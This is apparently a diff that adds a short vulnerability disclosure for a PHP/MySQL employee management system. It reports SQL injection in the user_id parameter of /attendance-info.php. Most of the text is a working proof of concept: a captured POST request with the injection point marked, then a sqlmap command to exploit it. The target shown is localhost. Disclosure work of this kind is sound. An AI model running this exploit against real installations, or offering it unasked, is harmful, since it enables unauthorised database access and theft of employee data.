@@ -1,1 +1,25 @@
+1. Download the source code and build it locally
 https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html
+
+2. Log in to the background access /attendance-info.php this path, grab the data package and save to 1.txt
+POC：
+POST /attendance-info.php HTTP/1.1
+Host: 127.0.0.1
+Sec-Fetch-Mode: navigate
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Sec-Fetch-Site: same-origin
+Accept-Encoding: gzip, deflate, br
+Referer: http://127.0.0.1/attendance-info.php
+Cookie: PHPSESSID=ndftlvordjqi331a1ublpbijg0; 
+Sec-Fetch-Dest: document
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-User: ?1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Content-Type: application/x-www-form-urlencoded
+
+add_punch_in=true&user_id=3*
+
+3. Use sqlmap for injection
+sqlmap -r 1.txt
+
